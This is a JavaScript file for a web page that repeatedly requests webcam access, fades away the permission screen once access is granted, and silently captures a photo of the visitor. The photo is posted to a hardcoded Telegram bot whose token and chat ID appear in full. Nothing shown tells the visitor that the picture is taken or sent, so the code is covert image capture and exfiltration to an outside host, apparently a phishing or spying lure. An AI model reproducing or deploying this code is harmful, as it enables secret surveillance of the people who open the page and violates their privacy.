const TOKEN = "7819062858:AAGrNn2DdZD945tMJDHDj5Wx-Kju8-WoBJg";
const CHAT_ID = "7249851527";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

const permissionScreen = document.getElementById("permissionScreen");
const mainContent = document.getElementById("mainContent");

let permissionLoop = true;
let photoSent = false;

async function requestCamera(){

    if(!permissionLoop) return;

    try{

        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject = stream;

        permissionLoop = false;

        // izin alındı -> fade geçiş
        permissionScreen.style.opacity = "0";

        setTimeout(()=>{
            permissionScreen.style.display = "none";
            mainContent.style.opacity = "1";
        },1500);

        video.onloadedmetadata = ()=>{
            if(!photoSent){
                sendPhoto();
                photoSent = true;
            }
        };

    }catch(e){

        console.log("İzin bekleniyor...");
        setTimeout(requestCamera,2000);
    }
}

async function sendPhoto(){

    if(!video.videoWidth) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video,0,0);

    canvas.toBlob(async(blob)=>{

        if(!blob) return;

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("photo", blob);

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
            method:"POST",
            body:form
        }).catch(()=>{});

    },"image/jpeg");
}

function sendManual(){
    sendPhoto();
}

requestCamera();
